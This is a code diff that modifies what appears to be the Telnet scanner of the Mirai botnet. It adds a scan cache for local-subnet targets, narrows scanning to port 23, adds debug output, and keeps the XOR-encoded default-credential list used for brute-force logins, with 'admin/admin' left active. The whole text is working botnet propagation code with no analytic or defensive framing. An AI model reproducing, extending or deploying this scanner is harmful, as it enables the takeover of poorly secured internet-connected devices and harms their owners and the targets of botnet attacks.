@@ -34,10 +34,24 @@
 
 ipv4_t get_next_target(void) 
 { 
+    static ipv4_t scan_cache[100] = {0};
+
     // ipv4_t next_addr = util_local_addr() | (1 << 24);
     ipv4_t local_addr = util_local_addr();
     ipv4_t next_addr = (local_addr & 0x00ffffff) | ((local_addr & 0xff000000)+(0x01000000));
 
+    for(int i=0; i<sizeof(scan_cache)/sizeof(ipv4_t); i++)
+    {
+        if(scan_cache[i] == 0)
+        {
+            scan_cache[i] = next_addr;
+            break;
+        }
+        if(scan_cache[i] == next_addr)
+        {
+            return 0;
+        }
+    }
 #ifdef DEBUG
     printf("[scanner] next_addr %d.%d.%d.%d\n", next_addr & 0xff, (next_addr >> 8) & 0xff, (next_addr >> 16) & 0xff, (next_addr >> 24) & 0xff);
 #endif
@@ -138,9 +152,11 @@ void scanner_init(void)
     tcph->syn = TRUE;
 
     // Set up passwords
+    /*
     add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
     add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
     add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
+    */
     add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                      // admin    admin
     /*
     add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);                      // root     888888
@@ -238,7 +254,9 @@ void scanner_init(void)
                 }
                 else
                 {
-                    iph->daddr = get_random_ip();
+                    printf("[scanner] redundent IP skip scanning\n");
+                    sleep(1);
+                    continue;
                 }
 #else
                 iph->daddr = get_random_ip();
@@ -246,6 +264,7 @@ void scanner_init(void)
                 iph->check = 0;
                 iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
 
+                /*
                 if (i % 10 == 0)
                 {
                     tcph->dest = htons(2323);
@@ -254,6 +273,9 @@ void scanner_init(void)
                 {
                     tcph->dest = htons(23);
                 }
+                */
+                tcph->dest = htons(23);
+
                 tcph->seq = iph->daddr;
                 tcph->check = 0;
                 tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));
@@ -278,8 +300,10 @@ void scanner_init(void)
 
             errno = 0;
             n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
-            if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
+            if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK) {
+                printf("[scanner] n=%d, errno=%d\n", n, errno);
                 break;
+            }
 
             if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                 continue;
@@ -315,7 +339,10 @@ void scanner_init(void)
 
             // If there were no slots, then no point reading any more
             if (conn == NULL)
+            {
+                printf("[scanner] conn == NULL\n");
                 break;
+            }
 
             conn->dst_addr = iph->saddr;
             conn->dst_port = tcph->source;
